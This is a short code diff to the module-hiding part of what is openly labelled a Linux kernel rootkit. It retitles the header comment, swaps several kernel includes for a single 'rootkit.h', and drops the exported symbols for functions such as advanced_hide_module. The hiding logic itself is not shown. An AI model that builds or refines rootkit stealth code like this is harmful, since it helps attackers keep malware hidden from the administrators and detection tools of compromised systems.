@@ -1,18 +1,9 @@
 /*
- * Advanced Module Hiding Implementation
- * Provides multiple methods to hide the rootkit module from detection
- * Kernel Version: 5.15.142
+ * Module Hiding Implementation
+ * Advanced techniques for hiding kernel modules from detection
  */
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/list.h>
-#include <linux/kobject.h>
-#include <linux/sysfs.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/uaccess.h>
-#include <linux/version.h>
+#include "rootkit.h"
 
 // 外部变量声明
 extern struct list_head *module_previous;
@@ -223,9 +214,4 @@ void cleanup_module_hiding(void) {
 }
 
 // 导出符号供主模块使用
-EXPORT_SYMBOL(advanced_hide_module);
-EXPORT_SYMBOL(advanced_show_module);
-EXPORT_SYMBOL(is_module_hidden);
-EXPORT_SYMBOL(get_hiding_status);
-EXPORT_SYMBOL(init_module_hiding);
-EXPORT_SYMBOL(cleanup_module_hiding);
+// Functions are part of the same module, no need to export
